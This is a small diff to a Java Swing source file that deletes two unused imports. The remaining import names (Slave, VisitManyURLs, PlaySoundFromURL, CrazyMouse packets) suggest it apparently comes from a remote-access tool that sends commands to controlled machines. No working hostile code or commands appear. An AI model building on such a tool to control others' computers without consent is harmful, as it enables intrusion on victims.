@@ -18,8 +18,6 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.SpinnerNumberModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
 import com.redpois0n.packets.outgoing.Packet39VisitManyURLs;
 import com.redpois0n.packets.outgoing.Packet44PlaySoundFromURL;
 import com.redpois0n.packets.outgoing.Packet46CrazyMouse;
